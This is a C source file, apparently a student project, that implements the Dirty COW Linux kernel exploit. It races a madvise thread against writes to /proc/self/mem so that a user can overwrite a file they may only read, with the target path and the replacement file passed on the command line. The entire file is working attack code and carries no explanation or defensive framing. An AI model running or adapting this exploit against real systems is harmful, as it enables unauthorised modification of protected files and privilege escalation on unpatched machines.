/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: snicolet <marvin@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/14 22:34:07 by snicolet          #+#    #+#             */
/*   Updated: 2018/05/14 23:09:01 by snicolet         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "libft.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#define COW "/proc/self/mem"
#define COW_CALLS 100000000
#define THREAD_ADIVSE 0
#define THREAD_MEM 1
#define THREAD_COUNT 2

static void		*map = NULL;

static void		*advise_hack(void *arg)
{
	t_buffer	*source;
	size_t		i;
	size_t		c;

	ft_printf("process madvise started\n");
	source = arg;
	i = 0;
	while (i < COW_CALLS)
	{
		c += madvise(map, 100, MADV_DONTNEED);
		i++;
	}
	ft_printf("madvise: %lu\n", c);
	return (NULL);
}

static void		*processmem(void *arg)
{
	t_buffer	*source;
	int			fd;
	size_t		i;
	size_t		c;

	ft_printf("process mem started\n");
	source = arg;
	fd = open(COW, O_RDWR);
	i = 0;
	while (i < COW_CALLS)
	{
		lseek(fd, (uintptr_t)map, SEEK_SET);
		c += write(fd, source->data, source->size);
		i++;
	}
	close(fd);
	ft_printf("process mem: %lu\n", c);
	return (NULL);
}

static void		init(int fd, const struct stat *st, const char *source_path)
{
	t_buffer		source;
	pthread_t		threads[THREAD_COUNT];

	source.data = ft_readfile(source_path, &source.size);
	if (!source.data)
	{
		ft_dprintf(STDERR_FILENO, "%s\n", "error: failed to read source file");
		return ;
	}
	map = mmap(NULL, st->st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	pthread_create(&threads[THREAD_ADIVSE], NULL, &advise_hack, &source);
	pthread_create(&threads[THREAD_MEM], NULL, &processmem, &source);
	pthread_join(threads[THREAD_ADIVSE], NULL);
	pthread_join(threads[THREAD_MEM], NULL);
	munmap(map, st->st_size);
	free(source.data);
}

int		main(int ac, char **av)
{
	const char		*target;
	int				fd;
	struct stat		st;

	if (ac < 3)
	{
		ft_dprintf(STDERR_FILENO, "%s%s%s\n", "usage: ", av[0],
				" <target> <new content>");
		return (EXIT_FAILURE);
	}
	target = av[1];
	fd = open(target, O_RDONLY);
	if (!fd)
	{
		ft_dprintf(STDERR_FILENO, "%s", "error: failed to open target\n");
		return (EXIT_FAILURE);
	}
	fstat(fd, &st);
	init(fd, &st, av[2]);
	close(fd);
	ft_printf("%s\n", "Dirty cow: finished.");
	return (EXIT_SUCCESS);
}
